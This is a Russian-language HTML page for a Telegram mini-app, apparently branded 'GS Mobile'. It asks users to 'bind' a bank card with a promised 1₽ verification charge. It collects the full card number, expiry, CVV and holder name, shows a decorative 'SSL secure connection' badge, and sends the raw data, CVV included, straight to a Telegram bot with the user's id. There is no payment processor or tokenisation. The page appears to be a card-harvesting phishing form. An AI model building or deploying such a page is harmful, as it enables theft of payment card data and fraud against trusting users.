<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Привязка карты - GS Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        .card-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: border-color 0.3s;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #667eea;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:active {
            transform: scale(0.98);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .secure-badge {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="card-icon">💳</div>
            <h1>Привязка банковской карты</h1>
            <p>С баланса будет списано 1₽ для проверки, затем вернётся обратно</p>
        </div>
        
        <form id="cardForm">
            <div class="form-group">
                <label for="cardNumber">Номер карты</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                <div class="error-message" id="cardNumberError">Введите корректный номер карты</div>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry">Срок действия</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                    <div class="error-message" id="expiryError">Введите корректный срок</div>
                </div>
                
                <div class="form-group">
                    <label for="cvv">CVV/CVC</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
                    <div class="error-message" id="cvvError">Введите CVV</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="cardHolder">Имя держателя карты</label>
                <input type="text" id="cardHolder" placeholder="IVAN IVANOV" required>
                <div class="error-message" id="cardHolderError">Введите имя держателя</div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">Привязать карту</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="loading-spinner"></div>
            <p>Обработка данных...</p>
        </div>
        
        <div class="secure-badge">
            <span>🔒</span>
            <span>Безопасное соединение SSL</span>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        // Форматирование номера карты
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });
        
        // Форматирование срока действия
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Отправка формы
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const cardHolder = document.getElementById('cardHolder').value;
            
            // Валидация
            let hasError = false;
            
            if (cardNumber.length < 16) {
                document.getElementById('cardNumberError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cardNumberError').style.display = 'none';
            }
            
            if (expiry.length < 5) {
                document.getElementById('expiryError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('expiryError').style.display = 'none';
            }
            
            if (cvv.length < 3) {
                document.getElementById('cvvError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cvvError').style.display = 'none';
            }
            
            if (cardHolder.length < 3) {
                document.getElementById('cardHolderError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cardHolderError').style.display = 'none';
            }
            
            if (hasError) return;
            
            // Показываем загрузку
            document.getElementById('cardForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Подготовка данных
            const cardData = {
                card_number: cardNumber,
                expiry: expiry,
                cvv: cvv,
                card_holder: cardHolder,
                user_id: tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null
            };
            
            // Отправка данных боту через WebApp
            tg.sendData(JSON.stringify(cardData));
            
            // Закрытие WebApp через 2 секунды
            setTimeout(() => {
                tg.close();
            }, 2000);
        });
    </script>
</body>
</html>
